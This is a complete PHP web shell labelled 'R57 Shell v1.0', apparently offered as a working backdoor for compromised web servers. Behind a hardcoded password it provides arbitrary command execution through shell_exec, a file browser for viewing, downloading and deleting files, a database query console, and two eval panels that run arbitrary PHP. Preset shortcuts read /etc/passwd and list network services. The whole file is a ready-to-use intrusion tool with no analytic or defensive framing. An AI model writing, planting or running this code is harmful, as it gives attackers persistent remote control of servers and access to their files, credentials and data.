<?php
/*
R57 Shell v1.0
*/

// Password
$password = "hack@123";

// Disable errors
error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');

// Authentication
session_start();
if(!isset($_SESSION['r57_logged'])) {
    if(isset($_POST['pass']) && $_POST['pass'] == $password) {
        $_SESSION['r57_logged'] = true;
    } else {
        echo '<!DOCTYPE html><html><head><title>R57 Shell</title></head><body>';
        echo '<form method="post"><input type="password" name="pass" placeholder="Password"><input type="submit"></form>';
        echo '</body></html>';
        exit;
    }
}

// Main Interface
?>
<!DOCTYPE html>
<html>
<head>
    <title>R57 Shell</title>
    <style>
        body { font-family: monospace; margin: 0; padding: 20px; background: #000; color: #0f0; }
        .header { background: #111; padding: 10px; border-bottom: 1px solid #0f0; }
        .menu { margin: 10px 0; }
        .menu a { color: #0f0; margin-right: 15px; text-decoration: none; }
        .menu a:hover { text-decoration: underline; }
        .content { background: #111; padding: 15px; border: 1px solid #0f0; }
        input, textarea, select { background: #000; color: #0f0; border: 1px solid #0f0; }
        pre { background: #000; padding: 10px; border: 1px solid #0f0; overflow: auto; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #222; }
        td, th { border: 1px solid #0f0; padding: 5px; }
    </style>
</head>
<body>

<div class="header">
    <h1>⚡ R57 Shell</h1>
    <p>Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?> | PHP: <?php echo phpversion(); ?> | User: <?php echo @exec('whoami'); ?></p>
</div>

<div class="menu">
    <a href="?">Home</a>
    <a href="?cmd">Command</a>
    <a href="?files">Files</a>
    <a href="?sql">SQL</a>
    <a href="?php">PHP</a>
    <a href="?eval">Eval</a>
    <a href="?logout">Logout</a>
</div>

<div class="content">
<?php
// Handle actions
if(isset($_GET['cmd'])) {
    echo '<h2>💻 Command Execution</h2>';
    echo '<form method="post">';
    echo 'Command: <input type="text" name="command" size="60" value="'.(isset($_POST['command'])?$_POST['command']:'id').'"> ';
    echo '<input type="submit" value="Execute">';
    echo '</form>';
    
    if(isset($_POST['command'])) {
        echo '<h3>Output:</h3><pre>';
        echo htmlspecialchars(@shell_exec($_POST['command'].' 2>&1'));
        echo '</pre>';
    }
}

elseif(isset($_GET['files'])) {
    echo '<h2>📁 File Manager</h2>';
    
    $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    
    // Navigation
    echo '<form method="get">';
    echo '<input type="hidden" name="files" value="1">';
    echo 'Directory: <input type="text" name="dir" value="'.$dir.'" size="60"> ';
    echo '<input type="submit" value="Go">';
    echo '</form>';
    
    // Upload
    echo '<h3>Upload File:</h3>';
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="file"> ';
    echo '<input type="submit" name="upload" value="Upload">';
    echo '</form>';
    
    // List files
    $files = @scandir($dir);
    echo '<h3>Files:</h3>';
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>';
    
    foreach($files as $file) {
        if($file == '.' || $file == '..') continue;
        
        $path = $dir.'/'.$file;
        $size = is_dir($path) ? '[DIR]' : filesize($path);
        $perms = substr(sprintf('%o', fileperms($path)), -4);
        
        echo '<tr>';
        echo '<td>'.(is_dir($path) ? '<b>'.$file.'</b>' : $file).'</td>';
        echo '<td>'.$size.'</td>';
        echo '<td>'.$perms.'</td>';
        echo '<td>';
        
        if(is_dir($path)) {
            echo '<a href="?files&dir='.urlencode($path).'">Open</a> ';
            echo '<a href="?delete&file='.urlencode($path).'" onclick="return confirm(\'Delete?\')">Delete</a>';
        } else {
            echo '<a href="?view&file='.urlencode($path).'">View</a> ';
            echo '<a href="?edit&file='.urlencode($path).'">Edit</a> ';
            echo '<a href="?download&file='.urlencode($path).'">Download</a> ';
            echo '<a href="?delete&file='.urlencode($path).'" onclick="return confirm(\'Delete?\')">Delete</a>';
        }
        
        echo '</td></tr>';
    }
    
    echo '</table>';
}

elseif(isset($_GET['sql'])) {
    echo '<h2>🗄️ SQL Manager</h2>';
    
    echo '<form method="post">';
    echo 'Host: <input type="text" name="host" value="localhost"><br>';
    echo 'User: <input type="text" name="user" value="root"><br>';
    echo 'Pass: <input type="password" name="pass"><br>';
    echo 'Database: <input type="text" name="db"><br>';
    echo '<input type="submit" name="connect" value="Connect">';
    echo '</form>';
    
    if(isset($_POST['connect'])) {
        $conn = @mysqli_connect($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
        
        if($conn) {
            echo '<h3>✅ Connected!</h3>';
            
            echo '<form method="post">';
            echo '<input type="hidden" name="host" value="'.$_POST['host'].'">';
            echo '<input type="hidden" name="user" value="'.$_POST['user'].'">';
            echo '<input type="hidden" name="pass" value="'.$_POST['pass'].'">';
            echo '<input type="hidden" name="db" value="'.$_POST['db'].'">';
            echo '<textarea name="query" rows="5" cols="80">SHOW TABLES</textarea><br>';
            echo '<input type="submit" name="execute" value="Execute">';
            echo '</form>';
            
            if(isset($_POST['execute'])) {
                $result = @mysqli_query($conn, $_POST['query']);
                if($result) {
                    echo '<table>';
                    while($row = @mysqli_fetch_assoc($result)) {
                        echo '<tr>';
                        foreach($row as $cell) {
                            echo '<td>'.$cell.'</td>';
                        }
                        echo '</tr>';
                    }
                    echo '</table>';
                } else {
                    echo 'Error: '.@mysqli_error($conn);
                }
            }
        } else {
            echo '❌ Connection failed!';
        }
    }
}

elseif(isset($_GET['php'])) {
    echo '<h2>🐘 PHP Code</h2>';
    
    echo '<form method="post">';
    echo '<textarea name="code" rows="10" cols="80">&lt;?php phpinfo(); ?&gt;</textarea><br>';
    echo '<input type="submit" value="Execute">';
    echo '</form>';
    
    if(isset($_POST['code'])) {
        echo '<h3>Result:</h3><pre>';
        ob_start();
        eval($_POST['code']);
        echo htmlspecialchars(ob_get_clean());
        echo '</pre>';
    }
}

elseif(isset($_GET['eval'])) {
    echo '<h2>⚡ PHP Eval</h2>';
    
    echo '<form method="post">';
    echo 'PHP Code: <input type="text" name="eval" size="60" value="'.(isset($_POST['eval'])?$_POST['eval']:'phpinfo();').'"> ';
    echo '<input type="submit" value="Eval">';
    echo '</form>';
    
    if(isset($_POST['eval'])) {
        echo '<h3>Result:</h3><pre>';
        ob_start();
        eval($_POST['eval']);
        echo htmlspecialchars(ob_get_clean());
        echo '</pre>';
    }
}

else {
    echo '<h2>🏠 R57 Shell Home</h2>';
    
    // Quick commands
    $quick_cmds = [
        'id' => 'User ID',
        'pwd' => 'Current Directory',
        'ls -la' => 'List Files',
        'uname -a' => 'System Info',
        'ps aux' => 'Processes',
        'netstat -tulpn' => 'Network',
        'df -h' => 'Disk Usage',
        'whoami' => 'Current User',
        'cat /etc/passwd' => 'Users List'
    ];
    
    echo '<h3>⚡ Quick Commands:</h3>';
    foreach($quick_cmds as $cmd => $desc) {
        echo '<a href="?cmd&command='.urlencode($cmd).'">'.$desc.'</a> | ';
    }
    
    // Server info
    echo '<h3>📊 Server Information:</h3><pre>';
    echo 'OS: '.php_uname()."\n";
    echo 'PHP: '.phpversion()."\n";
    echo 'Safe Mode: '.(ini_get('safe_mode')?'On':'Off')."\n";
    echo 'Disabled Functions: '.ini_get('disable_functions')."\n";
    echo 'Open Basedir: '.ini_get('open_basedir')."\n";
    echo '</pre>';
}

// Handle file operations
if(isset($_GET['view']) && isset($_GET['file'])) {
    echo '<h2>📄 View File</h2>';
    echo '<pre>'.htmlspecialchars(file_get_contents($_GET['file'])).'</pre>';
}

if(isset($_GET['download']) && isset($_GET['file'])) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($_GET['file']).'"');
    readfile($_GET['file']);
    exit;
}

// Logout
if(isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$_SERVER['PHP_SELF']);
    exit;
}
?>
</div>

</body>
</html>